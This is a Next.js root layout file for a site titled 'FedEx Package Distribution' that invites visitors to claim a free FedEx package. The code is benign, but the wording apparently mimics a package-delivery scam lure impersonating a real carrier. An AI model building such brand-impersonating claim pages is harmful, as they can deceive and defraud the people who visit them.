import type { Metadata } from 'next'
import './globals.css'
import Footer from './components/Footer'
import FollowFedEx from './components/FollowFedEx'

export const metadata: Metadata = {
  title: 'FedEx Package Distribution',
  description: 'Claim your eligible FedEx package. Free distribution program for verified recipients.',
  icons: {
    icon: '/favicon.ico',
  },
}

export default function RootLayout({
  children,
}: {
  children: React.ReactNode
}) {
  return (
    <html lang="en">
      <body className="min-h-screen bg-white flex flex-col">
        {children}
        <FollowFedEx />
        <Footer />
      </body>
    </html>
  )
}
